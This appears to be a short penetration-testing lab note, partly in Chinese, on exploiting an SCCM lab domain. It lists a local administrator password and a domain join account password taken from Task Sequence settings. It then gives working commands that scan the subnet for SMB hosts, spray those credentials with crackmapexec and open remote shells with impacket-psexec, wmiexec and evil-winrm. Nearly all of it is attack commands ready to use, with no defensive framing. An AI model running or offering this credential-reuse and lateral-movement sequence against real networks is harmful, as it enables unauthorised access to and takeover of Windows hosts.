Task Sequence 中的憑證

---

In TS Step "Apply Windows Settings":
OSDRegisteredUserName - administrator
OSDLocalAdminPassword - EP+xh7Rk6j90

In TS Step "Apply Network Settings":
OSDJoinAccount - sccm.lab\sccm-naa
OSDJoinPassword - 123456789

---

掃描同網段的 SMB 主機
# 使用 nmap 掃描 SMB 端口
nmap -p 445 --open 192.168.52.0/24 -oG smb_hosts.txt

# 提取存活主機清單
grep "445/open" smb_hosts.txt | awk '{print $2}' > targets.txt

# 查看找到的主機
cat targets.txt

---

枚舉可存取主機的共享

# 列出所有主機的共享
crackmapexec smb targets.txt -u 'sccm-naa' -p '123456789' -d 'sccm.lab' --shares

# 或對整個網段
crackmapexec smb 192.168.52.0/24 -u 'sccm-naa' -p '123456789' -d 'sccm.lab' --shares

---

# 測試網段內的主機
crackmapexec smb 192.168.52.0/24 -u 'administrator' -p 'EP+xh7Rk6j90' --local-auth

# 查看成功的主機
crackmapexec smb 192.168.52.0/24 -u 'administrator' -p 'EP+xh7Rk6j90' --local-auth | grep "Pwn3d"

# 發現可以登入的主機
impacket-psexec ./administrator:'EP+xh7Rk6j90'@192.168.52.13

# 或使用 wmiexec
impacket-wmiexec ./administrator:'EP+xh7Rk6j90'@192.168.52.13

evil-winrm -i 192.168.52.13 -u administrator -p 'EP+xh7Rk6j90'